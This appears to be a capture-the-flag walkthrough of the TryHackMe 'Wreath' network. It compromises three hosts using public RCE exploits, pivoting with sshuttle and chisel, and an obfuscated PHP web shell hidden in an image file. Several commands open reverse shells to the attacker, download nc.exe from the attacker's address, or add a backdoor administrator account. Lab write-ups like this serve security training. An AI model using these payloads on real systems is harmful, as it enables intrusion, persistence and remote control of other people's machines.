# Summary
This is a large room where there are 3 servers that we need to compromise. As two of them aren't directly accessible from our attacking machine we need to use tunneling. We will use the tools ```sshuttle``` and ```chisel``` for this.

> Note: View the sshuttle documentations at https://sshuttle.readthedocs.io/en/stable/

> Note: View the chisel documentations at https://www.chisel-lang.org/api/


# Recon
We start off with the usual nmap scan to discover running services:
```
sudo nmap -sC -sV -O 10.200.87.200 -T 5 -p-
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/1.png">
Altough nmap has difficulties trying to fingerprint the OS we can sprt that it's running CentOS by the info about the webservice on port 80.


# Initial Foothold
MiniServ versions lower and equal to 1.920 are vulnerable to remote code execution. We will use this to get our initial foothold.
> Exploit: https://github.com/MuirlandOracle/CVE-2019-15107

After running the following command we will have a root shell on the host:
```
sudo python3 CVE-2019-15107.py 10.200.87.200 
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/2.png">

By typing ```shell``` we can create a netcat reverse shell. I first tried port 4447 but it seems to be blocked by the firewall. After changing it to 53 we get a reverse shell on the host.

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/3.png">
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/4.png">

We find a ssh key in ```/root/.ssh/id_rsa``` so now we have ssh access as root which will ease the rest of the process.

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/5.png">

# Network Enumeration
From within our ssh shell we download a nmap binary to conduct a ping sweep from the host in an attempt to discover new hosts on the network.
```
./mystr0-nmap -sn 10.200.87.0/24 -oN scan-mystr0
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/6.png">

We find two new hosts (```.100,.150```) and start a nmap scan on both of them. ```10.200.87.100``` returned only filtered ports so we'll start with the other one.

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/7.png">

# Pivoting
We can't access the webservice directly from our attacking machine. We'll have to create a tunneled proxy in order to make the host available to us. 

```
 sshuttle -r root@10.200.87.200 --ssh-cmd "ssh -i id_rsa" 10.200.87.200/24 -x 10.200.87.200
 ```
>Note: We can't directly import our id_rsa file with sshuttle so we'll use ```--ssh-cmd``` to import it as a command.

>Note: We'll use the ```-x``` switch to exclude our compromised server from the subnet.

# Compromising 10.200.87.150
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/8.png">
We can now browse to the website and spot a few directories. We can't however access them because we are blocked by a login page. The main page shows a folder called gitstack which implicates that this is running on the host. As logging in with default credentials doesn't work we'll use searchsploit to look for any known exploits on that service.


>Exploit: https://www.exploit-db.com/exploits/43777

With this exploit we can execute commands remotely. The nice thing is, is that it uploads the exploit to the git environment where we can alter the ```POST``` requests to get more information on the host.
>Note: Change ```GET``` to ```POST``` and add the ```Content-Type```.

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/9.png">

We try to ping our attacking machine from ```10.200.87.150``` to see if we can setup a reverse shell back to our attacking machine.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/10.png">

Ping requests timed out so we need to use another way. There are two options. One is to set up a relay on ```10.200.87.200``` to pass our traffic through that host. Another way is to use our ssh root shell on the host to setup a netcat listener and use that host for further penetration.

I choose the latter and before doing so we need to open up the port that we'll be using for the shell. CentOS uses a wrapper around the IPTables firewall called ```firewalld```.
We use the next command to make the port public:
```
firewall-cmd --zone=public --add-port 15010/tcp
``` 

We set up our netcat listener on the host and then send our shell using curl:
```
curl -X POST http://10.200.87.150/web/exploit.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.200.87.200%27%2C15010)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22"
```

We now have a reverse netcat shell:

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/11.png">

We add an user with administrator privileges and remote access. That way we have more persistent access to the host.
```
net user mystr0 Password1! /add
net localgroup Administrators mystr0 /add
net localgroup "Remote Management Users" mystr0 /add
```

We can now use ```xfreerdp``` to get a remote desktop session on the host:
```
xfreerdp /u:mystr0 /p:Password1! /cert:ignore /v:10.200.87.150 /workarea
```
Or, use ```evil-wnrm``` for a command shell:
```
evil-winrm  -i 10.200.87.150 -u mystr0 -p Password1! 
```

# Compromising 10.200.87.100
From our ```evil-winrm``` session with ```10.200.87.150``` we upload ```Invoke-Portscan.ps1``` to start a portscan from that host:
```
upload Invoke-Portscan.ps1
. .\Invoke-Portscan.ps1
Invoke-Portscan -Hosts 10.200.87.0/24
```
We can see multiple open ports:

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/12.png">

We can't access the webserver directly so we'll use ```chisel``` to create a proxy. We download chisel to our host and add an exception in the firewall rules for the port that we will be using.

On .100
```
 netsh advfirewall firewall add rule name="chisel.exe" dir=in action=allow protocol=tcp localport=44444 
.\chisel.exe server -p 44444 --socks5
```

On attacking machine:
```
/chisel_1.7.3_linux_amd64 client 10.200.87.150:44444 44444:socks
```

After changing our proxy settings in FireProxy we can visit the page at ```http://10.200.87.100```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/13.png">

After searching around on the host I find a repository for the website at ```C:\GitStack\repositories\Website.git```. We download the repository to see if there is anything usefull inside. We find a reference to ```/resources``` as a file upload page.
We can login using earlier found credentials: ```Thomas:i<3ruby```

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/14.png">

We land on a page where we can upload images. We can try to upload a malicious image file to run commands on the host. After trying uploading various filetypes we learn that we can upload ```filename.jpeg.php``` files. There is however a check to see if the file is really an image so we'll have to use a real image, add php code to it's command, upload the file and hopefully are able to run commands.

We have a payload:
```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```
And we'll obfuscate the code to avoid possible antivirus detection. 
> Note: Use PHP obfuscator: https://www.gaijin.at/en/tools/php-obfuscator

```
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" test.jpg.php 
```
Upon browsing to the uploaded script we see that we can now run commands on the host:

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/15.png">

We can now download netcat to our host to setup a reverse shell: 
```
http://10.200.87.100/resources/uploads/test.jpeg.php?wreath=curl%20http://10.50.88.185/nc.exe%20-o%20c:\\windows\temp\nc-mystr0.exe
```

With a netcat listener ready on port 443 on our attacking machine we run the following command to get a reverse shell:
```
powershell.exe c:\\windows\\temp\\nc-mystr0.exe 10.50.88.185 443 -e cmd.exe
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/16.png">

# Privilege Escalation on 10.200.87.100
Let's search for non-default services:
```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/17.png">

We spot a service with a space in it's path that doesn't have quotation marks around it which means it might be vulnerable to unquoted service path attack. We'll check to see if the service is running as the local system account:
```
sc qc SystemExplorerHelpService
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/18.png">

Now let's see if we have write permissions on the first half of the path. This will enable us to place our own file and run it as local system user.
```
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/Wreath/assets/19.png">

-- To be continued --







